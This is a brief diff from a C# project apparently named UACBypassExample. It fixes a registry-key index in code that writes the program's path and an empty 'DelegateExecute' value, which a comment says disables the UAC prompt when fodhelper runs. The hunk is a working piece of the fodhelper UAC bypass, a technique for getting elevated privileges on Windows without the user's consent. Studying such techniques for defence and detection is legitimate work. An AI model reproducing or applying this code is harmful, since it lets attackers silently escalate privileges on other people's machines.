@@ -54,7 +54,7 @@ namespace UACBypassExample
                   Registry.SetValue(upath[isWin10up ? 0 : 1].RegPath, "", $"{Application.ExecutablePath}" /* put any arguments here if you want. */);
 
                   if (isWin10up)
-                        Registry.SetValue(upath[1].RegPath, "DelegateExecute", ""); // to disable UAC prompt in executing fodhelper.
+                        Registry.SetValue(upath[0].RegPath, "DelegateExecute", ""); // to disable UAC prompt in executing fodhelper.
                   
 		          // use this if your program is running on 32 bit accessing 64 bit system files.
 		          // it is used to prevent redirection to SysWOW64 when trying to access something
